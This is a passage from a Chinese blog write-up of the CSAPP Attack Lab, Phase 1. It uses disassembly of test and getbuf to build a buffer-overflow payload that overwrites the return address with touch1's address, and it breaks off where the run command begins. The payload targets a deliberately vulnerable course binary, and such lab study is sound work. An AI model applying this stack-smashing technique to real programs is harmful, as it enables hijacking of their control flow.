<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-system/CSAPP/Lab03-Attack_Lab">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.0">
<title data-rh="true">Lab3-Attack Lab 深入解析 | Notes</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://deconx.cn/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://deconx.cn/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://deconx.cn/system/CSAPP/Lab03-Attack_Lab"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Lab3-Attack Lab 深入解析 | Notes"><meta data-rh="true" name="description" content="纸上得来终觉浅，绝知此事要躬行"><meta data-rh="true" property="og:description" content="纸上得来终觉浅，绝知此事要躬行"><link data-rh="true" rel="icon" href="/img/favicon.svg"><link data-rh="true" rel="canonical" href="https://deconx.cn/system/CSAPP/Lab03-Attack_Lab"><link data-rh="true" rel="alternate" href="https://deconx.cn/system/CSAPP/Lab03-Attack_Lab" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://deconx.cn/system/CSAPP/Lab03-Attack_Lab" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Notes RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Notes Atom Feed">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/styles.a22b4ae4.css">
<link rel="preload" href="/assets/js/runtime~main.dfe70d3f.js" as="script">
<link rel="preload" href="/assets/js/main.2610bda6.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.ico" alt="My Site Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/logo.ico" alt="My Site Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">Notes</b></a><a class="navbar__item navbar__link" href="/blog">Blog</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/system">计算机基础</a><a class="navbar__item navbar__link" href="/code-daily">算法刷题</a><a class="navbar__item navbar__link" href="/ai">人工智能</a><a class="navbar__item navbar__link" href="/project">动手造轮子</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/kcxain" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/">首页</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/system">计算机基础</a><button aria-label="打开/收起侧边栏菜单「计算机基础」" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" tabindex="0" href="/system/CSAPP">CSAPP 实验解析</a><button aria-label="打开/收起侧边栏菜单「CSAPP 实验解析」" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/system/CSAPP/Lab01-Data_Lab">Lab1-Data Lab 深入解析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/system/CSAPP/Lab02-Bomb_Lab">Lab2-Bomb Lab 深入解析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/system/CSAPP/Lab03-Attack_Lab">Lab3-Attack Lab 深入解析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/system/CSAPP/Lab04-Architecture_Lab">Lab4-Architecture Lab 深入解析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/system/CSAPP/Lab05-Cache_Lab">Lab5-Cache Lab 深入解析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/system/CSAPP/Lab06-Performance_Lab">Lab6-Performance Lab 深入解析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/system/CSAPP/Lab07-Shell_Lab">Lab7-Shell Lab 深入解析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/system/CSAPP/Lab08-Malloc_Lab">Lab8-Malloc Lab 深入解析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/system/CSAPP/Lab09-Proxy_Lab">Lab9-Proxy Lab 深入解析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/system/CSAPP/gdb常用命令">gdb 常用命令</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/system/Computer-Network">计算机网络</a><button aria-label="打开/收起侧边栏菜单「计算机网络」" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/system/MIT6S081">MIT-6.s081 实验解析</a><button aria-label="打开/收起侧边栏菜单「MIT-6.s081 实验解析」" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/system/Software-Construction">软件构造</a><button aria-label="打开/收起侧边栏菜单「软件构造」" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/code-daily">算法刷题</a><button aria-label="打开/收起侧边栏菜单「算法刷题」" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/ai">人工智能</a><button aria-label="打开/收起侧边栏菜单「人工智能」" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/project">动手造轮子</a><button aria-label="打开/收起侧边栏菜单「动手造轮子」" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/system"><span itemprop="name">计算机基础</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/system/CSAPP"><span itemprop="name">CSAPP 实验解析</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Lab3-Attack Lab 深入解析</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><h1>Lab3-Attack Lab 深入解析</h1><blockquote><p>纸上得来终觉浅，绝知此事要躬行</p></blockquote><h2 class="anchor anchorWithStickyNavbar_LWe7" id="实验概览">实验概览<a href="#实验概览" class="hash-link" aria-label="实验概览的直接链接" title="实验概览的直接链接">​</a></h2><p>Attack！成为一名黑客不正是我小时候的梦想吗？这个实验一定会很有趣。</p><p>CMU 对本实验的官方说明文档：<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf%EF%BC%8C%E6%8C%89%E7%85%A7" target="_blank" rel="noopener noreferrer">http://csapp.cs.cmu.edu/3e/attacklab.pdf，按照</a> CMU 的文档一步步往下走就可以了。</p><p><img loading="lazy" src="/assets/images/image-20220303225536519-16608125438811-0e9aa5d00a74afe2ad00b82649f6280d.png" width="1240" height="519" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="part-1-code-injection-attacks">Part 1: Code Injection Attacks<a href="#part-1-code-injection-attacks" class="hash-link" aria-label="Part 1: Code Injection Attacks的直接链接" title="Part 1: Code Injection Attacks的直接链接">​</a></h2><p>在第一部分中，我们要攻击的是<code>ctarget</code>。利用<strong>缓冲区溢出</strong>，就是程序的栈中分配某个字符数组来保存一个字符串，而我们输入的字符串可以包含一些可执行代码的字节编码或者一个指向攻击代码的指针覆盖返回地址。那么就能直接实现直接攻击或者在执行<code>ret</code>指令后跳转到攻击代码。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="phase-1">Phase 1<a href="#phase-1" class="hash-link" aria-label="Phase 1的直接链接" title="Phase 1的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="分析">分析<a href="#分析" class="hash-link" aria-label="分析的直接链接" title="分析的直接链接">​</a></h3><p>首先给了<code>test</code>函数的C语言代码：</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">test</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> val</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    val </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">getbuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> val</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这个函数调用了<code>getbuf</code>函数，题目要求我们通过代码注入的方式使<code>getbuf</code>执行结束后不返回到<code>test</code>函数中，而是返回到<code>touch1</code>函数。</p><p><code>touch1</code>的C语言代码如下：</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">touch1</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    vlevel </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">/* Part of validation protocol */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Touch1!: You called touch1()\n&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">validate</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="反汇编test">反汇编<code>test</code><a href="#反汇编test" class="hash-link" aria-label="反汇编test的直接链接" title="反汇编test的直接链接">​</a></h3><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Dump of assembler code for function test:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x0000000000401971 &lt;+9&gt;:     callq  0x4017a8 &lt;getbuf&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x0000000000401978 &lt;+16&gt;:    mov    $0x403188,%esi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x000000000040197d &lt;+21&gt;:    mov    $0x1,%edi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x0000000000401982 &lt;+26&gt;:    mov    $0x0,%eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x0000000000401987 &lt;+31&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x000000000040198c &lt;+36&gt;:    add    $0x8,%rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x0000000000401990 &lt;+40&gt;:    retq</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End of assembler dump.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>第2行分配栈帧，第4行调用<code>getbuf</code>函数</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="反汇编getbuf">反汇编<code>getbuf</code><a href="#反汇编getbuf" class="hash-link" aria-label="反汇编getbuf的直接链接" title="反汇编getbuf的直接链接">​</a></h3><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Dump of assembler code for function getbuf:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004017af &lt;+7&gt;:     callq  0x401a40 &lt;Gets&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x00000000004017bd &lt;+21&gt;:    retq</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End of assembler dump.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>分配了40个字节的栈帧，随后将栈顶位置作为参数调用<code>Gets</code>函数，读入字符串。</p><p>此时，栈帧情况是这样的：（以8个字节为单位）</p><p><img loading="lazy" src="/assets/images/image-20220305095612188-16608125542844-1a1cf4178d9415d400932513295767d2.png" width="1390" height="661" class="img_ev3q"></p><p>查到<code>touch1</code>代码地址为：<code>0x4017c0</code></p><p>由此就有了思路，我们只需要输入41个字符，前40个字节将<code>getbuf</code>的栈空间填满，最后一个字节将返回值覆盖为<code>0x4017c0</code>即<code>touch1</code>的地址，这样，在<code>getbuf</code>执行<code>retq</code>指令后，程序就会跳转执行<code>touch1</code>函数。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="#solution" class="hash-link" aria-label="Solution的直接链接" title="Solution的直接链接">​</a></h3><p>采用<code>Write up</code>推荐方法，创建一个<code>txt</code>文档存储输入。并按照<code>HEX2RAW</code>工具的说明，在每个字节间用空格或回车隔开。</p><p><strong><code>x86</code>采用小端存储，要注意输入字节的顺序</strong></p><p>我们的输入为：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c0 </span><span class="token number" style="color:#36acaa">17</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 00 00 00 00</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>执行命令：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token 